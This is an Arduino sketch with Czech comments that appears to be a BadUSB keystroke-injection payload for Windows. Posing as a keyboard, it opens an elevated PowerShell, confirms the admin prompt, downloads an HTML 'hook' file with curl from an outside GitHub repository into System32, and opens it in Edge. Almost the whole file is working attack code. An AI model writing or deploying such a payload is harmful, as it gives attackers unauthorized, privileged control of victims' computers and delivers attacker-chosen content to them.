// POKUD NEFUNGUJE KOD ZMEN KLAVESNICI NA ENG
//kdyz pises Keyboard.press('') tak potrebujes ' a ne "", zkopiruj toto

#include <Keyboard.h>

void setup() {  
  Keyboard.begin(); 
  delay(2000);

//vzbuzeni PC

  Keyboard.write(KEY_RETURN);

//otevirani search baru

  Keyboard.press(KEY_LEFT_GUI);         
  Keyboard.releaseAll();     
  delay(1000);

//hledani PS v search baru

  Keyboard.print("PowerShell");
  delay(1000);

//zkratka pro otevreni PS v priv.


  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);

//potvrzeni otevreni PS v priv.

  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  
//stazeni .html z mojeho githubu (via curl)  

  Keyboard.print("curl.exe -o HTMLOOK.html https://raw.githubusercontent.com/I-AtA-I/BadUsb---win-payload/main/github-html.html");
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

//start edge

  Keyboard.print("start msedge");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(2000);

//zacatek psani do URL

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('l');
  Keyboard.releaseAll();
  delay(100);

//otevreni HTMLOOK.html (tvuj github html hook)

  Keyboard.print("C");
//":"
  Keyboard.print(":");
  Keyboard.releaseAll();

//Dopsani absolutni cesty
  Keyboard.print("Windows/System32/HTMLOOK.html");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  


}


void loop() {} 